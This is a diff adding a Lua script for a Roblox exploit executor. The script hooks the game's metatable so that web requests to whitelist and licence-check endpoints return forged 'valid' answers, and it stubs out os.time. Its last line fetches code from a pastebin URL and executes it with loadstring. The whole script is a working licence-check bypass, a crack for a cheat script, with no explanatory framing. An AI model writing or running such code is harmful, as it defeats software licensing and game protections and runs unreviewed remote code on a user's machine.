@@ -1,0 +1,32 @@
+local mt = getrawmetatable(game)
+local namecall = mt.__namecall
+local index = mt.__index
+local o = os
+local setreadonly = setreadonly or make_writeable
+
+setreadonly(o,false)
+setreadonly(mt,false)
+
+mt.__index = function(self,i)
+    if self == game and i == "HttpGet" then
+        return function(self,u,...)
+            if u:find("checkWhitelist.php") then
+                return "1"
+            end
+            if u:find("validMessage.php") then
+                return "II1II1II1I1I11I111I1II1I11I1I11III11I11I1I11I1I1II1I1II1III1I1I1I1I1I1I1I11I1I1I111I1I1III1I1I1I1III11I1I1I11I1II1II1I11I11I1I1I1I1I1I1I1I1I1I1II1I11I1I1I1I1I1I1I1I1I1I1III1I1II1I1III1I111I1I1I!I1I1II1I1I1I1I111I1I1I1I1I1I1I1I1I1I1I1I1I1I1I1I1I1I1"
+            end
+            if u:find("vfr.txt") then
+                return "1.3"
+            end
+            return index(self,u,...)
+        end
+    end
+    return index(self,i)
+end
+
+os.time = function()
+    return "1"
+end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/VpAs3KaQ"))()
